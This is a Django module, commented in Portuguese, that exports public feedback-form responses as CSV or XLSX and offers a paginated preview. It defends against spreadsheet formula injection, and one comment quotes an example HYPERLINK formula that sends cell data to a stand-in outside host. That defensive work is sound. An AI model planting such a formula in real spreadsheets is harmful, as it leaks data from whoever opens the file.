"""
EXPORTAÇÃO DOS FEEDBACKS EM TABELA — uma linha por RESPOSTA, uma coluna por dado.

Por que uma linha por RESPOSTA e não por pedido: desde que o link passou a
aceitar várias pessoas, um pedido tem N respostas. Uma linha por pedido
obrigaria a empilhar respostas numa célula, e planilha com célula multivalorada
não se filtra nem se soma — que é exatamente para o que a pessoa exporta.

Por que não entra no app `reports`: aquele sistema é de JOB (enfileira, gera em
disco, o cliente faz polling e baixa depois). Aqui o volume é pequeno e o botão
fica ao lado da busca — a pessoa espera o arquivo cair na hora. Streaming direto
é mais simples e não deixa arquivo no disco para expurgar depois.

AS COLUNAS DE PERGUNTA SÃO A UNIÃO DE TODAS AS VERSÕES DO FORMULÁRIO.
O formulário é versionado, e respostas antigas foram dadas sob outra definição.
Montar as colunas só da versão ativa jogaria fora o que foi respondido em
perguntas que não existem mais — silenciosamente. A união preserva tudo, e a
célula fica vazia quando aquela pergunta não existia para aquele respondente.
"""
from __future__ import annotations

import csv
import io

from django.http import HttpResponse
from django.utils import timezone

# Colunas fixas, antes das perguntas. A ordem é a de leitura: o que se avalia,
# em que pé está, quem respondeu e quando.
COLUNAS_BASE = [
    ('card', 'Card'),
    ('estado', 'Situação'),
    ('data_referencia', 'Entregue em'),
    ('respondente', 'Respondente'),
    ('setor', 'Setor'),
    ('enviado_em', 'Respondido em'),
    ('formulario_versao', 'Versão do formulário'),
]


def _linhas_e_colunas():
    """Devolve `(cabecalhos, linhas)` já prontos para qualquer formato."""
    from .models import PedidoFeedback
    from .serializers import resposta_legivel

    pedidos = (
        PedidoFeedback.objects
        .select_related('formulario')
        .prefetch_related('respostas')
        .order_by('-id')
    )

    # Primeiro passe: descobrir TODAS as perguntas já respondidas, preservando a
    # ordem de definição de cada versão. `dict` mantém ordem de inserção, então
    # ele serve de conjunto ordenado sem estrutura extra.
    perguntas: dict[str, str] = {}
    respostas_legiveis = []

    # SEMEIA pela definição ATIVA, na ordem dela. Sem isto a ordem das colunas
    # sairia da ordem em que os pedidos aparecem, e um campo acrescentado numa
    # versão nova ("Seu setor:") caía no FIM da planilha, longe do "Seu nome:"
    # ao qual pertence. As perguntas que só existem em versões antigas entram
    # depois, no laço abaixo — nada se perde, e o começo fica legível.
    from .models import FeedbackFormulario

    ativo = FeedbackFormulario.objects.filter(ativo=True).order_by('-versao').first()
    for campo in (ativo.campos if ativo else []):
        chave = campo.get('key')
        if chave:
            perguntas[chave] = campo.get('label') or chave

    for pedido in pedidos:
        for resposta in pedido.respostas.all():
            legivel = resposta_legivel(pedido, resposta)
            for item in legivel.get('itens', []):
                # O LABEL vem da versão que a pessoa VIU. Se duas versões usam a
                # mesma `key` com textos diferentes, fica o primeiro encontrado
                # (o mais recente, pela ordenação): a coluna é uma só, e trocar o
                # texto da pergunta não deve rachar a planilha em duas colunas.
                perguntas.setdefault(item['key'], item.get('label') or item['key'])
            respostas_legiveis.append((pedido, resposta, legivel))

    cabecalhos = [rotulo for _chave, rotulo in COLUNAS_BASE] + list(perguntas.values())

    linhas = []
    for pedido, resposta, legivel in respostas_legiveis:
        por_chave = {i['key']: i for i in legivel.get('itens', [])}
        linha = [
            pedido.referencia_publica or '',
            pedido.get_estado_display() if hasattr(pedido, 'get_estado_display') else pedido.estado,
            pedido.data_referencia.isoformat() if pedido.data_referencia else '',
            legivel.get('respondente') or '',
            legivel.get('setor_respondente') or '',
            # Fuso LOCAL: `enviado_em` é gravado em UTC, e exportar cru faria a
            # planilha discordar da tela em toda resposta do fim do dia.
            timezone.localtime(resposta.enviado_em).strftime('%d/%m/%Y %H:%M')
            if resposta.enviado_em else '',
            getattr(pedido.formulario, 'versao', ''),
        ]
        for chave in perguntas:
            item = por_chave.get(chave)
            valor = item.get('valor') if item else None
            # Célula VAZIA para "não existia" e para "não respondeu" é a mesma
            # coisa numa planilha, e forçar um texto ("não respondido") sujaria
            # filtros e contagens.
            linha.append('' if valor is None else valor)
        linhas.append(linha)

    return cabecalhos, linhas


# Os caracteres com que o Excel começa a ler uma FÓRMULA. Importam porque a
# fonte deste arquivo é texto livre de gente ANÔNIMA: o formulário é público,
# sem login, e quem tem o link escreve o que quiser no campo aberto.
#
# Sem tratamento, `=HYPERLINK("http://fora.tld/?d="&A2,"clique")` deixa de ser
# texto e vira fórmula VIVA na planilha — e o dano nem precisa de má-fé para
# aparecer: quem exporta nunca lê o que a pessoa escreveu, vê `#NAME?` no lugar.
# A planilha, como diz a própria view, "sai do sistema e passa a circular por
# e-mail e pendrive".
#
# A NEUTRALIZAÇÃO É NA SAÍDA, não na entrada: a validação do formulário deve
# continuar RECUSANDO o que é inválido, nunca reescrevendo em silêncio o que a
# pessoa respondeu. O texto guardado no banco continua sendo exatamente o que
# ela digitou; o que muda é como o arquivo o declara.
_PREFIXOS_DE_FORMULA = ('=', '+', '-', '@', '\t', '\r')


def _e_arriscado(valor) -> bool:
    return isinstance(valor, str) and valor[:1] in _PREFIXOS_DE_FORMULA


def _nome_do_arquivo(extensao: str) -> str:
    return f'feedbacks_{timezone.localdate().isoformat()}.{extensao}'


def exportar_csv() -> HttpResponse:
    cabecalhos, linhas = _linhas_e_colunas()

    buffer = io.StringIO()
    # `;` e BOM: é o que faz o Excel em pt-BR abrir o arquivo já colunado. Com
    # vírgula e sem BOM ele joga tudo numa coluna só e quebra os acentos — o
    # arquivo estaria "certo" e inútil.
    escritor = csv.writer(buffer, delimiter=';')
    escritor.writerow(cabecalhos)
    # No CSV a única defesa é o APÓSTROFO à frente: o Excel reinterpreta o
    # arquivo inteiro ao abrir, e aspas não o impedem de avaliar `=...`. Aqui os
    # quatro prefixos contam (no xlsx só o `=` vira fórmula, no CSV não).
    # O apóstrofo entra APENAS quando o valor começa com um deles — texto comum
    # sai idêntico ao que a pessoa escreveu.
    escritor.writerows(
        [f"'{valor}" if _e_arriscado(valor) else valor for valor in linha]
        for linha in linhas
    )

    resposta = HttpResponse(
        '﻿' + buffer.getvalue(),
        content_type='text/csv; charset=utf-8',
    )
    resposta['Content-Disposition'] = f'attachment; filename="{_nome_do_arquivo("csv")}"'
    return resposta


def exportar_xlsx() -> HttpResponse:
    from openpyxl import Workbook
    from openpyxl.styles import Font
    from openpyxl.utils import get_column_letter

    cabecalhos, linhas = _linhas_e_colunas()

    wb = Workbook()
    ws = wb.active
    ws.title = 'Feedbacks'
    ws.append(cabecalhos)
    for celula in ws[1]:
        celula.font = Font(bold=True)
    for linha in linhas:
        ws.append(linha)
        # DECLARA A CÉLULA COMO TEXTO em vez de prefixar com apóstrofo: o valor
        # guardado continua sendo exatamente o que a pessoa escreveu, e o Excel
        # exibe a string em vez de avaliá-la. Prefixar aqui sujaria o dado — no
        # xlsx o apóstrofo NÃO é removido na leitura, ao contrário do que
        # acontece quando se digita na planilha. Medido com openpyxl 3.1.5: sem
        # isto, `=...` sai com `data_type='f'`, uma fórmula de verdade.
        for celula in ws[ws.max_row]:
            if _e_arriscado(celula.value):
                celula.data_type = 's'
                celula.quotePrefix = True

    # `freeze_panes` + auto-filtro: a planilha nasce navegável. Sem isso, uma
    # tabela com dezenas de colunas de pergunta é ilegível ao rolar.
    ws.freeze_panes = 'A2'
    if linhas:
        ws.auto_filter.ref = f'A1:{get_column_letter(len(cabecalhos))}{len(linhas) + 1}'

    # Largura por conteúdo, com TETO: uma resposta longa de texto livre esticaria
    # a coluna para centenas de caracteres e empurraria o resto para fora da tela.
    for indice, _ in enumerate(cabecalhos, start=1):
        maior = max(
            [len(str(cabecalhos[indice - 1]))]
            + [len(str(l[indice - 1])) for l in linhas[:200]]
        )
        ws.column_dimensions[get_column_letter(indice)].width = min(max(maior + 2, 12), 60)

    buffer = io.BytesIO()
    wb.save(buffer)
    resposta = HttpResponse(
        buffer.getvalue(),
        content_type='application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
    )
    resposta['Content-Disposition'] = f'attachment; filename="{_nome_do_arquivo("xlsx")}"'
    return resposta


def previa(offset: int = 0, limit: int = 100) -> dict:
    """A MESMA tabela do arquivo, paginada, no formato do preview de relatórios.

    Reusa `_linhas_e_colunas` de propósito: a pré-visualização precisa ser o
    arquivo, não uma aproximação dele. Montar as colunas por um caminho
    separado é como as duas versões começam a divergir — e a pessoa só descobre
    depois de baixar.

    `key` sintética (`c0`, `c1`, …) porque o diálogo indexa a linha por chave, e
    os rótulos são texto livre da definição do formulário: dois campos podem ter
    o mesmo label, e aí uma coluna sobrescreveria a outra no dicionário.

    A PRÉVIA NÃO NEUTRALIZA PREFIXO DE FÓRMULA, e isso é deliberado: ela é
    desenhada no navegador, onde `=` é só um caractere. Aplicar aqui o mesmo
    apóstrofo do CSV mostraria à pessoa um texto que ela não escreveu — e a
    promessa da prévia é sobre QUAIS COLUNAS E LINHAS saem no arquivo, não sobre
    o artifício com que cada formato declara que a célula é texto.
    """
    cabecalhos, linhas = _linhas_e_colunas()
    colunas = [{'key': f'c{i}', 'label': rotulo} for i, rotulo in enumerate(cabecalhos)]

    fatia = linhas[offset:offset + limit]
    return {
        'columns': colunas,
        'rows': [
            {f'c{i}': valor for i, valor in enumerate(linha)}
            for linha in fatia
        ],
        'total': len(linhas),
        'offset': offset,
        'limit': limit,
        'has_more': offset + len(fatia) < len(linhas),
    }
